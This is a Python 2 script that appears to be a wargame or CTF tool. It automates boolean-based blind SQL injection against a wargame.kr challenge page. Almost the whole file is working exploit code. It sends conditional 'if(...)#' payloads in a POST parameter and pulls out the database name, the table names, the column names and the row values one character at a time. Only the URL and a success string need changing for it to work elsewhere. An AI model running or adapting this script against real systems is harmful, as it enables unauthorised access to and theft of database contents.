# !/usr/bin/env python
# wolfgang

class bcolors:
    BLACK = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

print bcolors.RED + "Made By: "
print " _       __      ____________                 "
print "| |     / /___  / / __/ ____/___ _____  ____ _"
print "| | /| / / __ \/ / /_/ / __/ __ `/ __ \/ __ `/"
print "| |/ |/ / /_/ / / __/ /_/ / /_/ / / / / /_/ / "
print "|__/|__/\____/_/_/  \____/\__,_/_/ /_/\__, /  "
print "                                     /____/   " 
print " " + bcolors.ENDC

import requests
from pwn import *
import sys



table = "wqertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890{}!@#$%^&*()-=_+[];'<>?/.,~`"

#Basic Input
URL = "http://wargame.kr:8080/ip_log_table/chk.php"
COOKIE = ""
SUCCESS = "2018"

#Parameter
para1 = "idx"
para2 = ""

#Check
print bcolors.WARNING + "[*] The URL which you wish to attack: " + bcolors.ENDC
print bcolors.OKBLUE + "[+] " + URL + bcolors.ENDC

print bcolors.WARNING + "[*] Your Cookie / Session: " + bcolors.ENDC
print bcolors.OKBLUE + "[+] " + COOKIE + bcolors.ENDC

print bcolors.WARNING + "[*] If Successful, Text String: " + bcolors.ENDC
print bcolors.OKBLUE +  "[+] " + SUCCESS + bcolors.ENDC


print bcolors.WARNING + "[*] Database Search(to skip '0', numbers only): " + bcolors.ENDC
is_skip = input("[>] ")


if is_skip != 0:
	d = log.progress("Database Length")
	d.status("Hacking...")

	for i in range(100):
		query = "if(length(database())="+str(i)+",22966, 1000)#"
		data = {para1: query}
		res = requests.post(URL, data=data)
		
		if SUCCESS in res.text:
			print bcolors.OKGREEN + "[+] Database Length: " + str(i) + bcolors.ENDC
			d.success()
			db_len = i
			break
	

db_name = ""


if is_skip != 0:
	d = log.progress("Database Name")
	d.status("Hacking...")
	sys.stdout.write("[*] ")
	for i in range(1, db_len+1):
       		for j in table:
			query = "if(ascii(substring((select database()),"+str(i)+",1))="+str(ord(j))+", 22966,100)#"
			data = {para1: query}
		
        		res = requests.post(URL, data=data)
			
        		if SUCCESS in res.text:
                		db_name += j
				sys.stdout.write(str(j))
				break

	d.success()
	print " "
	print bcolors.OKGREEN + "[+] Database Name: " + db_name + bcolors.ENDC



print bcolors.WARNING + "[*] Table Search(to skip '0', numbers only): " + bcolors.ENDC
is_skip = input("[>] ")

table_num = 0



if is_skip != 0:
	d = log.progress("Number Of Tables")
	d.status("Hacking...")
	for i in range (0, 1000):
		query = "if((select count(table_name) from information_schema.tables where table_type=0x62617365207461626c65)="+str(i)+",22966,100)#"
		data = {para1: query}
	
		res = requests.post(URL, data=data)

		if SUCCESS in res.text:
			print bcolors.OKGREEN + "[+] Number Of Tables: " + str(i) + bcolors.ENDC
			table_num = i
			d.success()
			break




table_len = []

if is_skip != 0:
	d = log.progress("Length Of Tables")
	d.status("Hacking...")
	for i in range (0, table_num):
		for j in range (0, 10000):
			query = "if((select length(table_name) from information_schema.tables  where table_type=0x62617365207461626c65 limit "+str(i)+",1)="+str(j)+",22966,100)#"
			data = {para1: query}
	
			res = requests.post(URL, data=data)

			if SUCCESS in res.text:
				print bcolors.OKGREEN + "[+]["+str(i)+"] Length Of Tables: " + str(j) + bcolors.ENDC
				table_len.append(j) 
				
				break
	d.success()


table_name = []
tn = ""
if is_skip != 0:
	d = log.progress("Name Of Tables")
	d.status("Hacking...")
	
	for i in range (0, table_num):
		limit = table_len[i]
		sys.stdout.write("["+str(i)+"] ")
		for j in range (1, limit+1):
			for k in table:
				query = "if(ascii(substring((select table_name from information_schema.tables where table_type=0x62617365207461626c65 limit "+str(i)+",1),"+str(j)+",1))="+str(ord(k))+",22966, 1000)#"
			
				data = {para1: query}

				res=requests.post(URL, data=data)
        			if SUCCESS in res.text:
					sys.stdout.write(str(k))
					tn += k
					break
		print " "
		table_name.append(tn)
		print bcolors.OKGREEN + "[+]["+str(i)+"] Name Of Tables: " + tn + bcolors.ENDC
		tn = ""
	d.success()
	

if is_skip == 0:
	Search_Name = raw_input("[*] Input The Table Name: ")
	Search_Name = Search_Name[:-1]
else:
	num = int(input("[*] Input The Table Number: "))
	Search_Name = table_name[num]



print bcolors.WARNING + "[*] Column Search(to skip '0', numbers only): " + bcolors.ENDC
is_skip = input("[>] ")

#print "0x" + Search_Name[:-1].encode('hex') # how to erase linefeed

if is_skip != 0:
	d = log.progress("Number Of Columns")
	d.status("Hacking...")
	for i in range (0, 1000):
		query = "if((select count(column_name) from information_schema.columns where table_name=0x"+Search_Name.encode('hex')+")="+str(i)+",22966,100)#"
		data = {para1: query}
	
		res = requests.post(URL, data=data)

		if SUCCESS in res.text:
			print bcolors.OKGREEN + "[+] Number Of Columns: " + str(i) + bcolors.ENDC
			column_num = i
			d.success()
			break




column_len = []
if is_skip != 0:
	d = log.progress("Length Of Columns")
	d.status("Hacking...")
	for i in range (0, column_num):
		for j in range (0, 100):
			query = "if((select length(column_name) from information_schema.columns  where table_name=0x"+Search_Name.encode('hex')+" limit "+str(i)+",1)="+str(j)+",22966,100)#"
			data = {para1: query}
	
			res = requests.post(URL, data=data)

			if SUCCESS in res.text:
				print bcolors.OKGREEN + "[+]["+str(i)+"] Length Of Columns: " + str(j) + bcolors.ENDC
				column_len.append(j) 
				
				break
	d.success()


column_name = []
cn = ""
if is_skip != 0:
	d = log.progress("Name Of Columns")
	d.status("Hacking...")
	
	for i in range (0, column_num):
		limit = column_len[i]
		sys.stdout.write("["+str(i)+"] ")
		for j in range (1, limit+1):
			for k in table:
				query = "if(ascii(substring((select column_name from information_schema.columns where table_name=0x"+Search_Name.encode('hex')+" limit "+str(i)+",1),"+str(j)+",1))="+str(ord(k))+",22966, 1000)#"
			
				data = {para1: query}

				res=requests.post(URL, data=data)
        			if SUCCESS in res.text:
					sys.stdout.write(str(k))
					cn += k
					break
		print " "
		column_name.append(cn)
		print bcolors.OKGREEN + "[+]["+str(i)+"] Name Of Columns: " + cn + bcolors.ENDC
		cn = ""
	d.success()

if is_skip == 0:
	Search_Name_C = raw_input("[*] Input The Column Name: ")
	Search_Name_C = Search_Name_C[:-1]
else:
	num = int(input("[*] Input The Column Number: "))
	Search_Name_C = column_name[num]


print bcolors.WARNING + "[*] Data Search " + bcolors.ENDC



d = log.progress("Number Of Datas")
d.status("Hacking...")
for i in range (0, 1000):
	query = "if((select count("+Search_Name_C+") from "+Search_Name+")="+str(i)+",22966,100)#"
	data = {para1: query}
	
	res = requests.post(URL, data=data)

	if SUCCESS in res.text:
		print bcolors.OKGREEN + "[+] Number Of Datas: " + str(i) + bcolors.ENDC
		data_num = i
		d.success()
		break



data_len = []

d = log.progress("Length Of Datas")
d.status("Hacking...")
for i in range (0, data_num):
	for j in range (0, 100):
		query = "if((select length("+Search_Name_C+") from "+Search_Name+" limit "+str(i)+",1)="+str(j)+",22966,100)#"
		data = {para1: query}
	
		res = requests.post(URL, data=data)

		if SUCCESS in res.text:
			print bcolors.OKGREEN + "[+]["+str(i)+"] Length Of Datas: " + str(j) + bcolors.ENDC
			data_len.append(j) 
			
			break
d.success()


data_name = []
dn = ""

d = log.progress("Value Of Datas")
d.status("Hacking...")
	
for i in range (0, data_num):
	limit = data_len[i]
	sys.stdout.write("["+str(i)+"] ")
	for j in range (1, limit+1):
		for k in table:
			query = "if(ascii(substring((select "+Search_Name_C+" from "+Search_Name+" limit "+str(i)+",1),"+str(j)+",1))="+str(ord(k))+",22966, 1000)#"
			
			data = {para1: query}
			res=requests.post(URL, data=data)
       			if SUCCESS in res.text:
				sys.stdout.write(str(k))
				dn += k
				break
	print " "
	data_name.append(dn)
	print bcolors.OKGREEN + "[+]["+str(i)+"] Value Of Datas: " + dn + bcolors.ENDC
	dn = ""
d.success()
	
'''
Must add:
1. Functions: For Faster reading and comprehension
2. A Menu Bar: to search the current table and the corresponding columns and data inside it
3. Loop: So that we can re-search
4. Fail: So that we know if we did not succeed
5. GET: current version is POST, must have GET
'''

